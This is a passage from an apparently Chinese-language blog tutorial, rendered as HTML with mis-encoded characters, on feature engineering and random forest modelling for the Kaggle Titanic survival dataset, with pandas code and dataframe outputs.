<span class="keyword">in</span> combined.iloc[<span class="number">891</span>:][<span class="string">&#x27;Cabin&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_cabin.add(c[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        test_cabin.add(<span class="string">&#x27;U&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> train_cabin</span><br></pre></td></tr></table></figure><pre><code>set(['A', 'C', 'B', 'E', 'D', 'G', 'F', 'U', 'T'])</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> test_cabin</span><br></pre></td></tr></table></figure><pre><code>set(['A', 'C', 'B', 'E', 'D', 'G', 'F', 'U'])</code></pre><p>æˆ‘ä»¬åœ¨æµ‹è¯•é›†ä¸­æ²¡æœ‰ä»»ä½•ä¸å­˜åœ¨äºè®­ç»ƒé›†ä¸­çš„èˆ¹èˆ±ä½ç½®å­—æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_cabin</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># replacing missing cabins with U (for Uknown)</span></span><br><span class="line">    combined.Cabin.fillna(<span class="string">&#x27;U&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># mapping each Cabin value with the cabin letter</span></span><br><span class="line">    combined[<span class="string">&#x27;Cabin&#x27;</span>] = combined[<span class="string">&#x27;Cabin&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> c: c[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dummy encoding ...</span></span><br><span class="line">    cabin_dummies = pd.get_dummies(combined[<span class="string">&#x27;Cabin&#x27;</span>], prefix=<span class="string">&#x27;Cabin&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, cabin_dummies], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    combined.drop(<span class="string">&#x27;Cabin&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;cabin&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°å°† <code>NaN</code> å€¼æ›¿æ¢ä¸º Uï¼ˆè¡¨ç¤º <em>Unknow</em> ï¼‰ã€‚ ç„¶åå®ƒå°†æ¯ä¸ª <code>Cabin</code> å€¼æ˜ å°„åˆ°ç¬¬ä¸€ä¸ªå­—æ¯ã€‚ç„¶åå®ƒå†æ¬¡ä½¿ç”¨è™šæ‹Ÿç¼–ç å¯¹èˆ±ä½å€¼è¿›è¡Œç¼–ç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_cabin()</span><br></pre></td></tr></table></figure><pre><code>Processing cabin : ok</code></pre><p>å¥½äº†ï¼Œæ²¡æœ‰ç¼ºå¤±å€¼äº†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>      <th>Cabin_A</th>      <th>Cabin_B</th>      <th>Cabin_C</th>      <th>Cabin_D</th>      <th>Cabin_E</th>      <th>Cabin_F</th>      <th>Cabin_G</th>      <th>Cabin_T</th>      <th>Cabin_U</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>  </tbody></table><h3><span id="chu-li-xing-bie-sex">å¤„ç†æ€§åˆ«ï¼ˆSexï¼‰</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_sex</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># mapping string values to numerical one</span></span><br><span class="line">    combined[<span class="string">&#x27;Sex&#x27;</span>] = combined[<span class="string">&#x27;Sex&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;male&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;female&#x27;</span>:<span class="number">0</span>&#125;)</span><br><span class="line">    status(<span class="string">&#x27;Sex&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°å°†å­—ç¬¦ä¸²å€¼ <code>male</code> å’Œ <code>female</code> åˆ†åˆ«æ˜ å°„åˆ°1å’Œ0ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_sex()</span><br></pre></td></tr></table></figure><pre><code>Processing Sex : ok</code></pre><h3><span id="chu-li-cheng-ke-deng-ji-pclass">å¤„ç†ä¹˜å®¢ç­‰çº§ï¼ˆPclassï¼‰</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_pclass</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># encoding into 3 categories:</span></span><br><span class="line">    pclass_dummies = pd.get_dummies(combined[<span class="string">&#x27;Pclass&#x27;</span>], prefix=<span class="string">&quot;Pclass&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># adding dummy variable</span></span><br><span class="line">    combined = pd.concat([combined, pclass_dummies],axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># removing &quot;Pclass&quot;</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Pclass&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;Pclass&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°ä½¿ç”¨è™šæ‹Ÿç¼–ç å¯¹ Pclassï¼ˆ1,2,3ï¼‰çš„å€¼è¿›è¡Œç¼–ç ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_pclass()</span><br></pre></td></tr></table></figure><pre><code>Processing Pclass : ok</code></pre><h3><span id="chu-li-chuan-piao-hao-ma-ticket">å¤„ç†èˆ¹ç¥¨å·ç ï¼ˆTicketï¼‰</span></h3><p>è®©æˆ‘ä»¬é¦–å…ˆçœ‹çœ‹æˆ‘ä»¬çš„æ•°æ®é›†ä¸­ä¸åŒçš„èˆ¹ç¥¨å·ç å‰ç¼€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cleanTicket</span>(<span class="params">ticket</span>):</span><br><span class="line">    ticket = ticket.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ticket = ticket.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ticket = ticket.split()</span><br><span class="line">    ticket = <span class="built_in">map</span>(<span class="keyword">lambda</span> t : t.strip(), ticket)</span><br><span class="line">    ticket = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> t : <span class="keyword">not</span> t.isdigit(), ticket))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ticket) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> ticket[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;XXX&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tickets = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> combined[<span class="string">&#x27;Ticket&#x27;</span>]:</span><br><span class="line">    tickets.add(cleanTicket(t))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(tickets)</span><br></pre></td></tr></table></figure><pre><code>37</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_ticket</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a function that extracts each prefix of the ticket, returns &#x27;XXX&#x27; if no prefix (i.e the ticket is a digit)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cleanTicket</span>(<span class="params">ticket</span>):</span><br><span class="line">        ticket = ticket.replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ticket = ticket.replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        ticket = ticket.split()</span><br><span class="line">        ticket = <span class="built_in">map</span>(<span class="keyword">lambda</span> t : t.strip(), ticket)</span><br><span class="line">        ticket = <span class="built_in">filter</span>(<span class="keyword">lambda</span> t : <span class="keyword">not</span> t.isdigit(), ticket)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ticket) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> ticket[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;XXX&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extracting dummy variables from tickets:</span></span><br><span class="line"></span><br><span class="line">    combined[<span class="string">&#x27;Ticket&#x27;</span>] = combined[<span class="string">&#x27;Ticket&#x27;</span>].<span class="built_in">map</span>(cleanTicket)</span><br><span class="line">    tickets_dummies = pd.get_dummies(combined[<span class="string">&#x27;Ticket&#x27;</span>], prefix=<span class="string">&#x27;Ticket&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, tickets_dummies], axis=<span class="number">1</span>)</span><br><span class="line">    combined.drop(<span class="string">&#x27;Ticket&#x27;</span>, inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;Ticket&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_ticket()</span><br></pre></td></tr></table></figure><pre><code>Processing Ticket : ok</code></pre><h3><span id="chu-li-jia-ting">å¤„ç†å®¶åº­</span></h3><p>è¿™éƒ¨åˆ†åŒ…æ‹¬æ ¹æ®å®¶åº­çš„å¤§å°åˆ›å»ºæ–°å˜é‡ï¼ˆå¤§å°æ˜¯æˆ‘ä»¬åˆ›å»ºçš„å¦ä¸€ä¸ªå˜é‡ï¼‰ã€‚</p><p>è¿™ç§æ–°å˜é‡çš„åˆ›å»ºæ˜¯åœ¨ä¸€ä¸ªç°å®çš„å‡è®¾ä¸‹å®Œæˆçš„ï¼šå¤§å®¶åº­èšé›†åœ¨ä¸€èµ·ï¼Œå› æ­¤ä»–ä»¬æ¯”å•ç‹¬æ—…è¡Œçš„äººæ›´æœ‰å¯èƒ½è·æ•‘ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_family</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># introducing a new feature : the size of families (including the passenger)</span></span><br><span class="line">    combined[<span class="string">&#x27;FamilySize&#x27;</span>] = combined[<span class="string">&#x27;Parch&#x27;</span>] + combined[<span class="string">&#x27;SibSp&#x27;</span>] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># introducing other features based on the family size</span></span><br><span class="line">    combined[<span class="string">&#x27;Singleton&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">    combined[<span class="string">&#x27;SmallFamily&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span> &lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">    combined[<span class="string">&#x27;LargeFamily&#x27;</span>] = combined[<span class="string">&#x27;FamilySize&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> s: <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span> &lt;= s <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;family&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°å¼•å…¥äº†4ä¸ªæ–°ç‰¹å¾ï¼š</p><ul><li><code>FamilySize</code>ï¼šåŒ…æ‹¬ä¹˜å®¢ï¼ˆä»–/å¥¹ï¼‰è‡ªå·±åœ¨å†…çš„äº²å±æ€»æ•°ã€‚</li><li><code>Sigleton</code>ï¼šæè¿° size = 1 çš„å®¶åº­çš„å¸ƒå°”å˜é‡</li><li><code>SmallFamily</code>ï¼šä¸€ä¸ªå¸ƒå°”å˜é‡ï¼Œæè¿° 2 &lt;= size &lt;= 4 çš„å®¶åº­</li><li><code>LargeFamily</code>ï¼šä¸€ä¸ªå¸ƒå°”å˜é‡ï¼Œæè¿° 5 &lt; size çš„å®¶åº­</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_family()</span><br></pre></td></tr></table></figure><pre><code>Processing family : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.shape</span><br></pre></td></tr></table></figure><pre><code>(1309, 67)</code></pre><p>æœ€åæˆ‘ä»¬å¾—åˆ°äº†67ä¸ªç‰¹å¾ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>      <th>Cabin_A</th>      <th>Cabin_B</th>      <th>Cabin_C</th>      <th>Cabin_D</th>      <th>Cabin_E</th>      <th>Cabin_F</th>      <th>Cabin_G</th>      <th>Cabin_T</th>      <th>Cabin_U</th>      <th>Pclass_1</th>      <th>Pclass_2</th>      <th>Pclass_3</th>      <th>Ticket_A</th>      <th>Ticket_A4</th>      <th>Ticket_A5</th>      <th>Ticket_AQ3</th>      <th>Ticket_AQ4</th>      <th>Ticket_AS</th>      <th>Ticket_C</th>      <th>Ticket_CA</th>      <th>Ticket_CASOTON</th>      <th>Ticket_FC</th>      <th>Ticket_FCC</th>      <th>Ticket_Fa</th>      <th>Ticket_LINE</th>      <th>Ticket_LP</th>      <th>Ticket_PC</th>      <th>Ticket_PP</th>      <th>Ticket_PPP</th>      <th>Ticket_SC</th>      <th>Ticket_SCA3</th>      <th>Ticket_SCA4</th>      <th>Ticket_SCAH</th>      <th>Ticket_SCOW</th>      <th>Ticket_SCPARIS</th>      <th>Ticket_SCParis</th>      <th>Ticket_SOC</th>      <th>Ticket_SOP</th>      <th>Ticket_SOPP</th>      <th>Ticket_SOTONO2</th>      <th>Ticket_SOTONOQ</th>      <th>Ticket_SP</th>      <th>Ticket_STONO</th>      <th>Ticket_STONO2</th>      <th>Ticket_STONOQ</th>      <th>Ticket_SWPP</th>      <th>Ticket_WC</th>      <th>Ticket_WEP</th>      <th>Ticket_XXX</th>      <th>FamilySize</th>      <th>Singleton</th>      <th>SmallFamily</th>      <th>LargeFamily</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>7.2500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>1</th>      <td>0</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>71.2833</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>0</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>7.9250</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>3</th>      <td>0</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>53.1000</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>2</td>      <td>0</td>      <td>1</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>1</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>8.0500</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>1</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>  </tbody></table><h2><span id="iii-mo-xing">III - æ¨¡å‹</span></h2><p>åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®æˆ‘ä»¬åˆ›å»ºçš„ç‰¹å¾å»ºç«‹ç»Ÿè®¡æ¨¡å‹ã€‚æ‚¨å¯ä»¥å°†æ­¤æ¨¡å‹è§†ä¸ºä¸€ä¸ªç›’å­ï¼Œå®ƒå¯ä»¥å¤„ç†ä»»ä½•æ–°ä¹˜å®¢çš„ä¿¡æ¯ï¼Œå¹¶å†³å®šä»–æ˜¯å¦èƒ½å¤Ÿå¹¸å­˜ã€‚</p><p>æœ‰å„ç§å„æ ·çš„æ¨¡å‹å¯ä¾›ä½¿ç”¨ï¼Œä»é€»è¾‘å›å½’åˆ°å†³ç­–æ ‘ï¼Œä»¥åŠæ›´å¤æ‚çš„æ¨¡å‹ï¼Œå¦‚éšæœºæ£®æ—å’Œæ¢¯åº¦æå‡æ ‘ã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨éšæœºæ£®æ—ã€‚Random Froests åœ¨ Kaggle æ¯”èµ›ä¸­è¯æ˜äº†å¾ˆé«˜çš„æœ‰æ•ˆæ€§ã€‚</p><p>æœ‰å…³ä¸ºä»€ä¹ˆé›†åˆæ–¹æ³•è¡¨ç°è‰¯å¥½çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥å‚è€ƒè¿™äº›å¸–å­ï¼š</p><ul><li><a href="http://mlwave.com/kaggle-ensembling-guide/">http://mlwave.com/kaggle-ensembling-guide/</a></li><li><a href="http://www.overkillanalytics.net/more-is-always-better-the-power-of-simple-ensembles/">http://www.overkillanalytics.net/more-is-always-better-the-power-of-simple-ensembles/</a></li></ul><p>å›åˆ°æˆ‘ä»¬çš„é—®é¢˜ï¼Œæˆ‘ä»¬ç°åœ¨å¿…é¡»ï¼š</p><p>1.å°†ç»„åˆæ•°æ®é›†åˆ†æˆè®­ç»ƒé›†å’Œæµ‹è¯•é›†ã€‚2.ä½¿ç”¨è®­ç»ƒé›†å»ºç«‹é¢„æµ‹æ¨¡å‹ã€‚3.ä½¿ç”¨è®­ç»ƒé›†è¯„ä¼°æ¨¡å‹ã€‚4.ä½¿ç”¨æµ‹è¯•é›†æµ‹è¯•æ¨¡å‹ï¼Œå¹¶ç”Ÿæˆå¹¶è¾“å‡ºæäº¤æ–‡ä»¶ã€‚</p><p>è¯·è®°ä½ï¼Œæˆ‘ä»¬å¿…é¡»é‡å¤ 2 å’Œ 3 ç›´åˆ°è¾¾åˆ°å¯æ¥å—çš„è¯„ä¼°åˆ†æ•°ã€‚</p><p>è®©æˆ‘ä»¬é¦–å…ˆå¯¼å…¥éœ€è¦ç”¨åˆ°çš„å‡½æ•°åŒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> make_pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble.gradient_boosting <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectKBest</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> StratifiedKFold</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_selection <span class="keyword">import</span> SelectFromModel</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression, LogisticRegressionCV</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è¯„ä¼°æˆ‘ä»¬çš„æ¨¡å‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨5æŠ˜äº¤å‰éªŒè¯ï¼ˆ5-fold cross validationï¼‰ï¼Œå› ä¸ºå®ƒæ˜¯åœ¨æ¯”èµ›æ’è¡Œæ¦œä¸­ä½¿ç”¨çš„æŒ‡æ ‡ã€‚</p><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†å®šä¹‰ä¸€ä¸ªå°çš„è¯„åˆ†å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">compute_score</span>(<span class="params">clf, X, y, scoring=<span class="string">&#x27;accuracy&#x27;</span></span>):</span><br><span class="line">    xval = cross_val_score(clf, X, y, cv = <span class="number">5</span>, scoring=scoring)</span><br><span class="line">    <span class="keyword">return</span> np.mean(xval)</span><br></pre></td></tr></table></figure><p>ä»ç»„åˆæ•°æ®é›†ä¸­æ¢å¤è®­ç»ƒé›†å’Œæµ‹è¯•é›†æ˜¯ä¸€é¡¹ç®€å•çš„ä»»åŠ¡ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recover_train_test_target</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line"></span><br><span class="line">    targets = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>, usecols=[<span class="string">&#x27;Survived&#x27;</span>])[<span class="string">&#x27;Survived&#x27;</span>].values</span><br><span class="line">    train = combined.iloc[:<span class="number">891</span>]</span><br><span class="line">    